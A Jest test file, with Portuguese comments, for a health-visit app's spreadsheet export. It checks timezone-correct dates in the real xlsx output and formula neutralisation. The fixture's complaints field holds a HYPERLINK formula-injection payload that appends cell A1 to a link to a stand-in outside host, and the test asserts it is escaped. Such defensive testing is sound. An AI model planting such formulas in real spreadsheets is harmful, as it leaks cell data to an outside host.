/**
 * Planilha de verdade, no fuso de quem usa o aplicativo.
 *
 * O teste do exportService mocka o `xlsx` e usava data com hora, então nunca
 * abriu o arquivo gerado nem viu a data como o aplicativo grava: só o dia,
 * `2026-10-13`. Lida como meia-noite UTC, no Brasil ela vira dia 12 às 21h, e
 * era isso que saía na coluna Data. Aqui o `xlsx` é o real e o arquivo é lido
 * de volta.
 */
const FUSO_ORIGINAL = process.env.TZ;
process.env.TZ = 'America/Sao_Paulo';

const escritas: { nome: string; conteudo: unknown }[] = [];

jest.mock('expo-file-system', () => {
  class FileFake {
    uri: string;
    nome: string;
    exists = false;
    constructor(_pasta: unknown, nome: string) {
      this.nome = nome;
      this.uri = `file:///documents/${nome}`;
    }
    create() {}
    delete() {}
    write(conteudo: unknown) {
      escritas.push({ nome: this.nome, conteudo });
    }
  }
  return { File: FileFake, Paths: { document: 'file:///documents/' } };
});

jest.mock('expo-sharing', () => ({
  isAvailableAsync: jest.fn().mockResolvedValue(true),
  shareAsync: jest.fn().mockResolvedValue(undefined),
}));

import { read, utils } from 'xlsx';
import { exportService } from '../exportService';
import { Visita, StatusVisita, StatusSync } from '../../types';

const visita: Visita = {
  id: 'v1',
  agente_id: 'a1',
  residencia_id: 'r1',
  data_visita: '2026-10-13',
  status: StatusVisita.REALIZADA,
  queixas: '=HYPERLINK("http://fora.example/"&A1,"clique")',
  observacoes: 'Pressão controlada',
  precisa_agendamento: true,
  especialidade_agendamento: 'Cardiologia',
  created_at: '2026-10-13T13:45:00.000Z',
  updated_at: '2026-10-13T13:45:00.000Z',
  status_sync: StatusSync.SINCRONIZADO,
};

function lerPlanilha() {
  const bytes = escritas[0].conteudo as Uint8Array;
  const livro = read(bytes, { type: 'array' });
  const aba = livro.Sheets[livro.SheetNames[0]];
  return { livro, linhas: utils.sheet_to_json<Record<string, string>>(aba) };
}

beforeEach(() => {
  escritas.length = 0;
});

afterAll(() => {
  process.env.TZ = FUSO_ORIGINAL;
});

describe('planilha de visitas exportada', () => {
  it('confere o fuso do teste', () => {
    // Sem isto o teste passaria em máquina UTC mesmo com o defeito de volta.
    expect(new Date('2026-10-13').getDate()).toBe(12);
  });

  it('gera um .xlsx que abre como planilha, com a aba do período', async () => {
    await exportService.exportarVisitas(
      { visitas: [visita], periodo: 'mes', data_referencia: '2026-10-31' },
      'xlsx'
    );

    expect(escritas[0].nome).toBe('visitas_mes_2026-10-31.xlsx');
    const { livro, linhas } = lerPlanilha();
    expect(livro.SheetNames).toEqual(['Visitas - Mensal']);
    expect(linhas).toHaveLength(1);
  });

  it('mostra o dia da visita, e não o anterior', async () => {
    await exportService.exportarVisitas(
      { visitas: [visita], periodo: 'mes', data_referencia: '2026-10-31' },
      'xlsx'
    );

    const [linha] = lerPlanilha().linhas;
    expect(linha['Data']).toBe('13/10/2026');
  });

  it('a hora vem do registro, e não de um 21:00 inventado pelo fuso', async () => {
    await exportService.exportarVisitas(
      { visitas: [visita], periodo: 'mes', data_referencia: '2026-10-31' },
      'xlsx'
    );

    const [linha] = lerPlanilha().linhas;
    expect(linha['Horário']).toBeUndefined();
    expect(linha['Registrado em']).toContain('13/10/2026');
    expect(linha['Registrado em']).toContain('10:45');
  });

  it('leva os demais campos e neutraliza fórmula no texto livre', async () => {
    await exportService.exportarVisitas(
      { visitas: [visita], periodo: 'mes', data_referencia: '2026-10-31' },
      'xlsx'
    );

    const [linha] = lerPlanilha().linhas;
    expect(linha['Status']).toBe('Realizada');
    expect(linha['Agendamento']).toBe('Sim');
    expect(linha['Especialidade']).toBe('Cardiologia');
    expect(linha['Observações']).toBe('Pressão controlada');
    expect(linha['Queixas'].startsWith("'=")).toBe(true);
  });
});
